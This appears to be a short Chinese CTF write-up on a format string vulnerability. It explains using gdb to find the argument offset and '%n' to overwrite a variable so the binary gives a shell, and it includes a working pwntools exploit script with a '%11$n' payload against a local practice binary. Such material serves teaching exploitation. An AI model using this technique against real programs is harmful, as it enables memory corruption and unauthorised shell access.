+ 这道题要将 `x` 改为4，那么我们可以将**格式化字符串的格式** 的前4个字节设置为将要修改的数值的地址，然后通过 `%n` 将这个地址（存放的是x的值）里面的数值改为 `4` 这样就可以达到我们的目的。而具体 **格式化字符串这个格式字符串** 存放在栈的哪个位置，换算一下是 `printf` 的第几个参数，要通过 `gdb` 调试得到。

  ![image-20201022210004901](https://raw.githubusercontent.com/smallzhong/picgo-pic-bed/master/image-20201022210004901.png)

  于是我们通过 `%n` 将 `x` 存放的地址的值改为 `4` ，就可以 `getshell` 。

+ `exp` 如下

  ```python3
  from pwn import *
  
  io = process("./fmtstr1")
  
  elf = ELF("./fmtstr1")
  
  payload = flat([p32(0x0804A02C), b"%11$n"])
  
  io.send(payload)
  
  io.interactive()
  ```

  